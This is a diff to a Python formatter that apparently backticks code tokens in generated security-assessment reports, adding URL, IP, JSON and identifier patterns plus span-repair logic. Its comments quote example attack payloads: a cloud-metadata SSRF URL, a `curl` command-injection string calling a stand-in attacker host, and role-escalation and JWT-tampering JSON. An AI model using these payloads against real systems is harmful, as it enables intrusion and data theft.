@@ -305,6 +305,223 @@ _NOSQL_OBJECT_RE = re.compile(
 _NOSQL_OPERATOR_RE = re.compile(
     r"\\?\$(?:gt|gte|lt|lte|ne|eq|in|nin|where|regex|exists|or|and|not|elemMatch|set|push|all)\b"
 )
+# 2026-07-19 — token classes the report still shipped BARE (user report on the
+# insecure-python-app run). Each is a demonstrated inconsistency, not a
+# hypothetical: the SAME token was backticked in one section and bare in another.
+#
+#   - Absolute URLs, including bare-IP hosts. The SSRF finding narrates
+#     `http://169.254.169.254/latest/meta-data/` as the attacker payload; §7
+#     backticked it, the §8 register cell shipped it bare. Runs BEFORE
+#     `_URL_PATH_RE`, which would otherwise claim only the `/latest/meta-data/`
+#     tail and leave the scheme+host stranded outside the span.
+#     Parens are excluded from the charset in BOTH directions: a URL embedded
+#     in a code payload (`'curl http://attacker.com/$(id)'`) would otherwise
+#     match up to the `)` and swallow an unbalanced `(`, emitting nested
+#     backticks that corrupt the surrounding span.
+_URL_RE = re.compile(
+    r"(?<![\w`/])"
+    r"(?P<url>(?:https?|ftp|file|ws|wss)://[^\s`<>\"'()\[\]]+)"
+    r"(?![\w`])"
+)
+#   - Bare IPv4 literals / host:port / CIDR used without a scheme
+#     (`169.254.169.254`, `127.0.0.1:8000`, `0.0.0.0`, `10.0.0.0/8`). Every
+#     octet is range-checked IN the pattern and all four are required, so
+#     dotted version strings (`1.2.3` — three parts) are structurally
+#     unmatchable. IPs inside a URL are already masked by the `url` pass.
+_IPV4_OCTET = r"(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)"
+_IP_RE = re.compile(
+    r"(?<![\w`.:/-])"
+    r"(?P<ip>" + _IPV4_OCTET + r"(?:\." + _IPV4_OCTET + r"){3}(?::\d{1,5})?(?:/\d{1,2})?)"
+    # A sentence-final period must not reject the match — a blanket `.`
+    # exclusion made the engine backtrack off the `:port` to find a legal
+    # boundary and shipped `` `127.0.0.1`:8000 ``. Only a period that
+    # CONTINUES the address (a fifth octet) disqualifies it.
+    r"(?![\w`])(?!\.\d)"
+)
+#   - JSON object literals used bare in prose as the attacker's payload:
+#     `{"is_staff": true}`, `{"alg":"HS256"}`, `{"role":"ADMIN","admin":1}`.
+#     These share the `{…}` matcher and the whole wrap machinery with the
+#     NoSQL pass — only the CONTENT GATE differs (a quoted key instead of a
+#     Mongo operator), so one `obj` pass serves both.
+_JSON_KEY_RE = re.compile(r'"[\w.$-]+"\s*:')
+#   - snake_case identifiers used bare in prose (`verify_signed_jwt`,
+#     `read_unsigned_jwt_claims`, `require_signed_jwt`). An underscore-joined
+#     lowercase token has no English reading, so requiring an underscore makes
+#     ordinary prose structurally unmatchable — no allowlist needed. These
+#     shipped bare *in the same sentence as* a correctly backticked
+#     `auth.py:84`, which is exactly the inconsistency the user flagged.
+#     The trailing exclusion rejects `.`, `(` and `/` so a token that is really
+#     the head of a longer expression (`crypto_services.py:14`,
+#     `update_user(payload)`) is left to the file / call passes instead of
+#     being half-wrapped — the very defect `_merge_split_code_spans` repairs.
+#     A sentence-final period is fine (`… and legacy_authenticate_raw.`) — only
+#     a period that CONTINUES the token (`crypto_services.py`) disqualifies it,
+#     hence the `(?!\.\w)` rather than a blanket `.` exclusion.
+#     An optional dotted module prefix is admitted (`hmac.compare_digest`,
+#     `subprocess.check_output`, `db.find_user_by_id`) — the underscore in the
+#     member still carries the whole guarantee, and without the prefix the pass
+#     would wrap only the member and strand the module outside the span.
+_SNAKE_IDENT_RE = re.compile(
+    r"(?<![\w`./$-])"
+    r"(?P<snake>(?:[a-z][a-z0-9]*\.)?[a-z][a-z0-9]*(?:_[a-z0-9]+)+)"
+    r"(?![\w`/(])(?!\.\w)"
+)
+#   - SCREAMING_SNAKE constants and dunders used bare in prose:
+#     `JWT_SIGNING_KEY`, `DB_PASSWORD`, `APP_REGION`, `__builtins__`,
+#     `__reduce__`. Same guarantee as the lowercase form — an underscore-joined
+#     all-caps token is never English — and these are exactly the tokens a
+#     secrets/config finding narrates, so they appeared bare in §3 and §8 while
+#     the surrounding `auth.py:18` was correctly formatted.
+_CONST_IDENT_RE = re.compile(
+    r"(?<![\w`./$-])"
+    r"(?P<const>__\w+__|[A-Z][A-Z0-9]*(?:_[A-Z0-9]+)+)"
+    r"(?![\w`/(])(?!\.\w)"
+)
+#   - A dangling quoted subscript left in prose after the head of an
+#     enumeration was merged: ``request.data['role'] / ['is_staff']``. The
+#     quoted key makes this unambiguous — a Markdown link label `[text](url)`
+#     carries no quotes and is masked anyway.
+_BARE_SUBSCRIPT_RE = re.compile(r"(?<![\w`\]])(?P<sub>\[['\"][\w.$-]+['\"]\])(?![\w`])")
+#   - A whole call expression WITH arguments used bare in prose:
+#     `update_user_mass_assignment(current_user_id, request.json)`,
+#     `crypto.recover_password(item['secret'])`. `_FUNCTION_CALL_RE` only
+#     covers the empty-arg form `foo()`. Without this the narrower identifier
+#     passes below (`api`, `snake`) each grab a token from INSIDE the argument
+#     list and emit exactly the half-formatted result this whole section exists
+#     to prevent — `update_user_mass_assignment(\`current_user_id\`,
+#     \`request.json\`)`. Wrapping the expression as one span makes it a
+#     forbidden zone for all of them. Gated by `_looks_like_call_args` so a
+#     prose aside (`the check (a legacy path)`) is never swallowed.
+_CALL_WITH_ARGS_RE = re.compile(
+    r"(?<![\w`.])"
+    r"(?P<call>[A-Za-z_]\w*(?:\.[A-Za-z_]\w*)*\([^()\n]{1,80}\))"
+    r"(?![\w`])"
+)
+
+# --- Split code-span repair -------------------------------------------------
+# The LLM routinely backticks only the HEAD of a code token and leaves the
+# continuation bare:
+#     `request.data`['role']            `requests.get`(url, timeout=3)
+#     `/api/integration/fetch`?url=     `JWT_SIGNING_KEY` = b'…'
+# The result is worse than no span at all, because the break lands INSIDE an
+# identifier and the reader sees two half-tokens. These passes pull the
+# continuation back into the span. They run at the TOP of `_wrap_line`, so the
+# repaired span is already a forbidden zone for every token pass that follows.
+# Idempotent by construction: once merged, the tail is inside the backticks and
+# no pattern matches again.
+# The head must be a single code TOKEN — no whitespace. A permissive
+# `[^`\n]+` head does not know that backticks pair up, so the engine happily
+# treats the CLOSING backtick of one span and the OPENING backtick of the next
+# as a pair and swallows the prose between them:
+#     available in `.route-inventory.json`
+#   → `…category … available in .route`-inventory.json`
+# (found 2026-07-19 by re-running the formatter over a whole real report —
+# per-string tests cannot surface it, because it needs two spans on one line).
+# Prose between two spans always contains a space, so excluding whitespace
+# eliminates the entire class. Every legitimate head is space-free:
+# `request.data`, `/api/legacy-admin/audit`, `db.py:461`, `requests.get`.
+_SPAN_HEAD = r"`(?P<head>[^`\s\n]+)`"
+# The tail must start with a LETTER. Allowing a leading `_` made the pass merge
+# a Markdown emphasis closer into the span — ``\`pentest-tasks.yaml\`._`` (the
+# `_` closing an italic run) became ``\`pentest-tasks.yaml._\``, silently
+# eating the emphasis marker. Members that genuinely start with `_` are rare
+# and dunders are covered by `_CONST_IDENT_RE`.
+_SPLIT_DOTTED_RE = re.compile(_SPAN_HEAD + r"\.(?P<tail>[A-Za-z]\w*(?:\.[A-Za-z_]\w*)*)(?![\w`(])")
+# No tail may CONTAIN a backtick. A continuation is by definition outside every
+# span, so a tick inside one means the pattern has crossed into the next span
+# and is reading the line on a wrong pairing. Without this, a remediation line
+# whose snippet already had ticks interleaved mid-expression got merged further
+# apart instead of being left alone (2026-07-19, real report line 3881).
+_SPLIT_SUBSCRIPT_RE = re.compile(_SPAN_HEAD + r"(?P<tail>(?:\[[^\[\]`\n]{1,40}\])+)(?![\w`])")
+_SPLIT_QUERY_RE = re.compile(_SPAN_HEAD + r"(?P<tail>\?[\w=&%.:/<>-]{1,80})(?![\w`])")
+_SPLIT_RANGE_RE = re.compile(r"`(?P<head>[^`\n]*:\d+)`-(?P<tail>\d+)\b")
+# `requests.get`(url, timeout=3) — the head must be a bare dotted identifier
+# (no `:`), so a `file.py:550`(…) evidence ref can never be swallowed.
+_SPLIT_CALLARGS_RE = re.compile(r"`(?P<head>[A-Za-z_][\w.]*)`(?P<tail>\([^()`\n]{1,60}\))(?![\w`])")
+# `JWT_SIGNING_KEY` = b'…' — the VALUE gets its own span rather than being
+# merged into the name's. The `=` sits in prose ("obtains X = Y"); swallowing
+# it would turn a sentence fragment into one long unreadable code token.
+_SPLIT_ASSIGN_VALUE_RE = re.compile(r"(?P<lead>`[A-Za-z_][\w.]*`\s*=\s*)(?P<val>[bru]?[\"'][^\"'\n]{1,80}[\"'])(?!`)")
+# Prose words that mark a `(...)` as an English aside rather than call args.
+_PROSE_ASIDE_RE = re.compile(r"\b(?:the|a|an|which|that|and|or|not|see|e\.g|i\.e|via)\b", re.IGNORECASE)
+
+
+def _looks_like_call_args(tail: str) -> bool:
+    """True when a trailing ``(...)`` reads as call ARGUMENTS, not a prose aside.
+
+    ``(url, timeout=3)`` → arguments. ``(the legacy path)`` → prose. Without
+    this gate the call-args merge would swallow ordinary parentheticals that
+    happen to follow a code span.
+    """
+    inner = tail.strip("()").strip()
+    if not inner:
+        return True
+    if _PROSE_ASIDE_RE.search(inner):
+        return False
+    # English optional-plural suffix — `weakness(es)`, `finding(s)`, `step(s)`,
+    # `point(s)`. Structurally identical to a one-argument call, so only the
+    # shape of the argument separates them: no real argument is a bare
+    # one-to-three-letter lowercase word. Without this the formatter backticked
+    # nine distinct prose pluralisations in a single real report (2026-07-19).
+    if re.fullmatch(r"[a-z]{1,3}", inner):
+        return False
+    return bool(re.fullmatch(r"[\w'\"`.,:=\[\]{}*/+\s-]+", inner))
+
+
+def _inside_bare_call(line: str, pos: int) -> bool:
+    """True when *pos* sits inside the argument list of an un-backticked call.
+
+    Scans left for an unmatched ``(``; the call is "bare" when that paren abuts
+    an identifier character (``foo(``, not ``… (``) and the identifier is not
+    itself already inside a code span.
+    """
+    depth = 0
+    for i in range(pos - 1, -1, -1):
+        c = line[i]
+        if c == ")":
+            depth += 1
+        elif c == "(":
+            if depth:
+                depth -= 1
+                continue
+            prev = line[i - 1] if i else " "
+            return bool(prev.isalnum() or prev == "_")
+        elif c == "`":
+            return False
+    return False
+
+
+def _merge_split_code_spans(line: str) -> tuple[str, int]:
+    """Pull un-backticked continuations back into the code span they belong to."""
+    # Ambiguous-pairing guard. Every pattern here assumes the backticks on the
+    # line pair up, so it can tell a span's closing tick from the next span's
+    # opening tick. On an odd count that assumption is false and a merge lands
+    # on the wrong boundary, deepening damage the composer already shipped
+    # (real case: a §9 remediation line whose LLM-authored snippet interleaved
+    # ticks mid-expression). Leaving a malformed line untouched is strictly
+    # better than rewriting it on a wrong reading.
+    if line.count("`") % 2:
+        return line, 0
+    n = 0
+    for pat, repl in (
+        (_SPLIT_DOTTED_RE, r"`\g<head>.\g<tail>`"),
+        (_SPLIT_SUBSCRIPT_RE, r"`\g<head>\g<tail>`"),
+        (_SPLIT_QUERY_RE, r"`\g<head>\g<tail>`"),
+        (_SPLIT_RANGE_RE, r"`\g<head>-\g<tail>`"),
+        (_SPLIT_ASSIGN_VALUE_RE, r"\g<lead>`\g<val>`"),
+    ):
+        line, k = pat.subn(repl, line)
+        n += k
+
+    def _merge_call(m: re.Match[str]) -> str:
+        if not _looks_like_call_args(m.group("tail")):
+            return m.group(0)
+        return f"`{m.group('head')}{m.group('tail')}`"
+
+    line, k = _SPLIT_CALLARGS_RE.subn(_merge_call, line)
+    return line, n + k
+
+
 _BACKTICK_SPAN_RE = re.compile(r"`[^`\n]+`")
 _MD_LINK_URL_RE = re.compile(r"\]\(([^)]+)\)")
 _HTML_ATTR_RE = re.compile(r'(?:href|src|action|formaction)="[^"]+"')
@@ -342,19 +559,29 @@ def _wrap_line(line: str) -> tuple[str, int]:
     backticked in pass N is treated as forbidden by pass N+1 (prevents
     nested-backtick artifacts like `` ``login.ts`` ``).
     """
-    n_total = 0
+    # Repair half-backticked tokens BEFORE any wrapping pass, so the merged
+    # span is a single forbidden zone for everything below and no pass sees a
+    # token fragment (2026-07-19).
+    line, n_total = _merge_split_code_spans(line)
 
-    # Order matters: HTTP-method-path runs FIRST because its match consumes
-    # both the method and the path; otherwise `_URL_PATH_RE` would
-    # backtick the path while leaving the method bare on the outside.
-    # Then path tokens, then bare filenames, then function calls, then
-    # literal allowlist. _PATH_RE last so it doesn't shadow more-specific
-    # patterns (it only matches `<word>/<file>.<ext>` shapes anyway).
+    # Order matters: absolute URLs run FIRST — they are the longest token and
+    # would otherwise be carved up by `_URL_PATH_RE` (path tail) and `_IP_RE`
+    # (host). HTTP-method-path runs next because its match consumes both the
+    # method and the path; otherwise `_URL_PATH_RE` would backtick the path
+    # while leaving the method bare on the outside. Then path tokens, then bare
+    # filenames, then function calls, then literal allowlist. _PATH_RE late so
+    # it doesn't shadow more-specific patterns (it only matches
+    # `<word>/<file>.<ext>` shapes anyway). The bare-identifier passes
+    # (`snake`, `sub`) run LAST of all: every longer construct that merely
+    # CONTAINS an identifier — a path, a filename, a call — must already own its
+    # span, or the identifier pass would half-wrap it.
     pass_order: list[tuple[re.Pattern[str], str]] = [
+        (_URL_RE, "url"),
         (_HTTP_METHOD_PATH_RE, "_http_method_path"),
         # NoSQL operator objects run early so the whole `{…}` span is wrapped
         # before the inner tokens are exposed to later single-token passes.
         (_NOSQL_OBJECT_RE, "obj"),
+        (_CALL_WITH_ARGS_RE, "call"),
         (_LIB_VERSION_RE, "libver"),
         (_URL_PATH_RE, "urlpath"),
         (_BARE_FILENAME_RE, "file"),
@@ -365,6 +592,10 @@ def _wrap_line(line: str) -> tuple[str, int]:
         (_CVE_RE, "cve"),
         (_CODE_API_RE, "api"),
         (_PATH_RE, "path"),
+        (_IP_RE, "ip"),
+        (_SNAKE_IDENT_RE, "snake"),
+        (_CONST_IDENT_RE, "const"),
+        (_BARE_SUBSCRIPT_RE, "sub"),
     ]
 
     for pat, group_or_special in pass_order:
@@ -462,9 +693,18 @@ def _wrap_line(line: str) -> tuple[str, int]:
             # left alone), and unescape the composer's `\$`→`$` so the code
             # span renders the operator cleanly.
             if group_or_special == "obj":
-                if not _NOSQL_OPERATOR_RE.search(tok):
+                # Content gate — a `{…}` span is only code when it carries a
+                # Mongo/NoSQL operator OR a quoted JSON key. Plain prose sets
+                # (`{read, write}`) and template placeholders (`{username}`)
+                # match neither and stay bare. The JSON arm (2026-07-19) covers
+                # the attacker-payload literals the walkthroughs narrate:
+                # `{"is_staff": true}`, `{"alg":"HS256"}`.
+                if not (_NOSQL_OPERATOR_RE.search(tok) or _JSON_KEY_RE.search(tok)):
                     continue
                 tok = tok.replace("\\$", "$")
+            # Call-expression pass: only wrap when the parens read as ARGUMENTS.
+            if group_or_special == "call" and not _looks_like_call_args(tok[tok.index("(") :]):
+                continue
             # Globs and wildcards never get backticked — they may be
             # YAML-derived prose like `routes/**`.
             if "*" in tok:
@@ -494,6 +734,15 @@ def _wrap_line(line: str) -> tuple[str, int]:
             after = line[ge] if ge < len(line) else " "
             if before in "._":
                 continue
+            # Enclosing-expression guard (2026-07-19). The single-char checks
+            # below only see the immediate neighbours, so a token sitting in the
+            # ARGUMENT LIST of a call that no pass managed to wrap as a whole
+            # still got backticked on its own — `foo(\`current_user_id\`)`. If
+            # the match is inside an unclosed `(` whose opening paren abuts an
+            # identifier, it is part of a larger code expression: leave it bare
+            # rather than half-format it. Bare beats half-wrapped.
+            if _inside_bare_call(line, gs):
+                continue
             if before in "'\"" and after in "'\"":
                 continue
             if after == "(" and "." in tok:
@@ -502,7 +751,14 @@ def _wrap_line(line: str) -> tuple[str, int]:
                 continue
             # Strip trailing punctuation (`.`, `,`, `;`, `)`, `?`, `!`).
             trailing = ""
+            # A token whose parens are BALANCED owns its closing `)` — stripping
+            # it would push the paren outside the span and leave the call
+            # visibly unterminated (`` `foo(a, b` ) ``). Only an unmatched
+            # trailing `)` is prose punctuation.
+            _balanced_parens = tok.count("(") == tok.count(")") and "(" in tok
             while tok.endswith((".", ",", ";", ")", "?", "!")) and not tok.endswith("()"):
+                if tok.endswith(")") and _balanced_parens:
+                    break
                 # Preserve trailing `()` on function-calls; everything else
                 # (period, comma, semicolon, closing paren in prose) goes
                 # OUTSIDE the backtick span.
@@ -519,7 +775,15 @@ def _wrap_line(line: str) -> tuple[str, int]:
         line = "".join(out2)
         n_total += n_changes
 
-    return line, n_total
+    # Second merge sweep. The pass at the top only sees spans the LLM authored;
+    # spans created by the wrapping passes above can themselves acquire a bare
+    # continuation — `__builtins__` is backticked by the `const` pass, and only
+    # then is `` `__builtins__`['__import__'] `` a split span. Running the
+    # repair once more closes that ordering gap; without it the merge landed on
+    # the NEXT invocation, so the formatter was not idempotent over a document
+    # (found 2026-07-19 by re-running it over a whole real report).
+    line, n_merge = _merge_split_code_spans(line)
+    return line, n_total + n_merge
 
 
 _AI_PADDING_SENTENCE_RE = re.compile(
